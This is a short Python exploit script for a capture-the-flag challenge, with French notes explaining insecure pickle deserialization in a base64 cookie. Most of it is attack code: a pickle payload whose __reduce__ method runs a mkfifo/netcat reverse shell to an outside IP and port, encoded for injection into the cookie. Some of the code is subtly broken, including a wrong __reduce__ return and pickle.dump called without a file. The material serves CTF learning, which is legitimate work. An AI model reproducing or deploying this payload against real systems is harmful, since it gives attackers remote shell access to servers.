import pickletools
import base64
import pickle
import os

s = "gASVCAAAAAAAAACMBHRlc3SULg=="
v = base64.b64decode(s)

z = pickletools.dis(v)


print(v)
print(z)


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.227.19 9001 > /tmp/f')
        return os.system(cmd)

if __name__ == '__main__':
    pickled = pickle.dump(RCE())
    print(base64.urlsafe_b64encode(pickled))

"""
Ce code rapide a servi pour le CTF "Baked Pie". 
En capturant une requête avec Burp, nous constatons la présence d'un 
"search_cookie", encodée en Base64. 

La première partie du script permet donc de décoder ce cookie. 
L'output indique l'utilisation de pickle, un format pour sérialiser
(convertir en octet) des objets Python. 
La sérialisation est l'action de transformer un objet en une suite d'octets
pour l'envoyer ou le stocker. Ainsi, le workflow (simplifié) est le suivant : 
pickle.dumps(obj) -> sérialise l'objet en bytes.
pickle.loads(bytes) -> recrée l'objet en mémoire. 



Le problème est que contrairement à JSON, pickle encode des instructions sur 
comment reconstruire l'objet. Or, cela comprend également les appels à fonctions. 
Par conséquent, pickle ne doit en théorie pas utiliser des données client-side. 


La deuxième partie du script exploite cette vulnérabilité, en encodant l'appel d'une
fonction (picke.loads) sur des données non-authentifiées. Cela permet donc à un 
attaquant (nous) de faire exécuter n'importe quelle fonction sur le serveur. 
Source : https://davidhamann.de/2020/04/05/exploiting-python-pickle/


    0: \x80 PROTO      4
    2: \x95 FRAME      8
   11: \x8c SHORT_BINUNICODE 'test'
   17: \x94 MEMOIZE    (as 0)
   18: .    STOP
highest protocol among opcodes = 4
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04test\x94.'
None

Première ligne : les deux premiers octets indiquent que la pickle 
utilise le protocole 4. 
La troisième ligne montre notre input ("test")

Pourquoi pickletools ? Nous pourrions utiliser pickle.load() 
mais c'est une mauvaise pratique. L'idée est que pickle.loads
exécute la reconstruction définie par la pickle. Donc, sur des flux 
non fiables, cela peut exécuter du code arbitraire. 

"""